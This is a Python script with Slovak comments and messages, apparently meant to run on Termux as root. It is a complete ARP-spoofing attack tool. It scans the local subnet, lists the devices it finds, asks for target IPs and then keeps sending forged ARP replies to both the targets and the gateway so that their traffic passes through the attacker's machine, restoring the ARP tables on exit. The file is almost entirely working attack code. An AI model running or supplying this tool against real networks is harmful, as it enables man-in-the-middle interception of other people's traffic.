from scapy.all import *
from time import sleep
import os
import socket
import sys
from prettytable import PrettyTable
from termcolor import colored

interface = conf.iface  # použije default rozhranie (napr. wlan0)

# === Farebné výpisy ===
def info(msg): print(colored(f"[i] {msg}", "cyan"))
def success(msg): print(colored(f"[✓] {msg}", "green"))
def warning(msg): print(colored(f"[!] {msg}", "yellow"))
def error(msg): print(colored(f"[✗] {msg}", "red"))

# === Získaj gateway IP ===
def get_default_gateway():
    with os.popen("ip route | grep default") as f:
        route = f.read().strip()
    return route.split()[2] if route else None

# === Získaj MAC podľa IP ===
def get_mac(ip):
    answered, _ = arping(ip, timeout=2, verbose=False, iface=interface)
    for _, r in answered:
        return r[Ether].src
    return None

# === Spoof ARP ===
def spoof(target_ip, spoof_ip, target_mac):
    packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    sendp(packet, iface=interface, verbose=False)

# === Obnov pôvodný stav ===
def restore(target_ip, spoof_ip, target_mac, spoof_mac):
    packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    sendp(packet, count=4, iface=interface, verbose=False)

# === Získaj hostname ===
def get_hostname(ip):
    try:
        return socket.gethostbyaddr(ip)[0]
    except:
        return "-"

# === Skenuj sieť ===
def scan_network(network):
    info("Skenujem Default Gateway, zariadenia, MAC a IP a Názvy...")
    ans, _ = arping(network, timeout=3, iface=interface, verbose=False)
    table = PrettyTable(["IP adresa", "MAC adresa", "Hostname"])
    for s, r in ans:
        ip = r.psrc
        mac = r.hwsrc
        name = get_hostname(ip)
        table.add_row([ip, mac, name])
    print(colored(table.get_string(), "white"))

# === Hlavná logika ===
def main():
    gateway_ip = get_default_gateway()
    if not gateway_ip:
        error("Nepodarilo sa získať Default Gateway.")
        sys.exit(1)

    network_prefix = ".".join(gateway_ip.split(".")[:3]) + ".0/24"
    scan_network(network_prefix)

    print()
    user_input = input(colored("Vybrať target IP (viac IP oddelené čiarkou): ", "yellow"))
    target_ips = [ip.strip() for ip in user_input.split(",") if ip.strip()]

    gateway_mac = get_mac(gateway_ip)
    if not gateway_mac:
        error("Zlyhalo získanie MAC gateway.")
        sys.exit(1)

    # Získaj MAC adresy cieľov
    targets = []
    for ip in target_ips:
        mac = get_mac(ip)
        if mac:
            targets.append((ip, mac))
        else:
            warning(f"Nepodarilo sa získať MAC pre {ip}")

    if not targets:
        error("Žiadny platný cieľ nebol nájdený.")
        sys.exit(1)

    try:
        success("Spoofujem ARP tabuľky... (stlač Ctrl+C pre ukončenie)")
        while True:
            for ip, mac in targets:
                spoof(ip, gateway_ip, mac)
                spoof(gateway_ip, ip, gateway_mac)
            sleep(2)
    except KeyboardInterrupt:
        print()
        warning("Obnovujem pôvodné ARP záznamy...")
        for ip, mac in targets:
            restore(ip, gateway_ip, mac, gateway_mac)
            restore(gateway_ip, ip, gateway_mac, mac)
        success("ARP záznamy obnovené. Koniec.")

if __name__ == "__main__":
    if os.geteuid() != 0:
        error("Spusti tento skript ako root (napr. cez `tsu` v Termux).")
        sys.exit(1)
    main()